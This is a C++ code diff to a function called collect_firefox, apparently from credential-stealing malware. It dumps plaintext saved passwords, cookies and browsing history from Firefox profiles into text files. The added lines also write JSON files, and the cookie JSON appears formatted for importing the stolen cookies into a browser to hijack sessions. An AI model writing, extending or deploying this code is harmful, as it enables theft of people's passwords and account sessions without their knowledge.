@@ -550,14 +550,52 @@ void collect_firefox(const BrowserConfig& browser) {
 
         try {
             std::ofstream pass_file(profile_dir / "passwords.txt");
-            for (auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
-            std::ofstream(profile_dir / "passwords.json") << json(p_data.passwords).dump(4);
+            json pj_pass = json::array();
+            for (auto& p : p_data.passwords) {
+                pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
+                pj_pass.push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}});
+            }
+            pass_file.close();
+            std::ofstream(profile_dir / "passwords.json") << pj_pass.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
 
             std::ofstream cookie_file(profile_dir / "cookies.txt");
-            for (auto& c : p_data.cookies) cookie_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
+            json cookie_json_list = json::array();
+            for (auto& c : p_data.cookies) {
+                cookie_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
+                json cj;
+                std::string host_raw = c.host;
+                if (host_raw.find("http") != 0) host_raw = "https://" + (host_raw[0] == '.' ? host_raw.substr(1) : host_raw);
+                if (host_raw.back() != '/') host_raw += "/";
+                cj["Host raw"] = ensure_utf8(host_raw);
+                cj["Name raw"] = ensure_utf8(c.name);
+                cj["Path raw"] = ensure_utf8(c.path);
+                cj["Content raw"] = ensure_utf8(c.value);
+                long long unix_ts = (c.expires_utc / 1000000) - 11644473600LL;
+                std::time_t t = (std::time_t)unix_ts;
+                struct tm *tm_ptr = std::gmtime(&t);
+                char date_buf[64];
+                if (tm_ptr && std::strftime(date_buf, sizeof(date_buf), "%d-%m-%Y %H:%M:%S", tm_ptr)) cj["Expires"] = std::string(date_buf);
+                cj["Expires raw"] = std::to_string(unix_ts);
+                cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection";
+                cj["Send for raw"] = c.is_secure ? "true" : "false";
+                cj["HTTP only raw"] = c.is_httponly ? "true" : "false";
+                cj["SameSite raw"] = "no_restriction";
+                cj["This domain only"] = (c.host[0] == '.') ? "Valid for subdomains" : "Valid for host only";
+                cj["This domain only raw"] = (c.host[0] == '.') ? "false" : "true";
+                cj["First Party Domain"] = "";
+                cookie_json_list.push_back(cj);
+            }
+            cookie_file.close();
+            std::ofstream(profile_dir / "cookies.json") << cookie_json_list.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
 
             std::ofstream hist_file(profile_dir / "history.txt");
-            for (auto& h : p_data.history) hist_file << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n";
+            json pj_hist = json::array();
+            for (auto& h : p_data.history) {
+                hist_file << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n";
+                pj_hist.push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}});
+            }
+            hist_file.close();
+            std::ofstream(profile_dir / "history.json") << pj_hist.dump(4, ' ', false, nlohmann::json::error_handler_t::replace);
         } catch (...) {}
     }
 
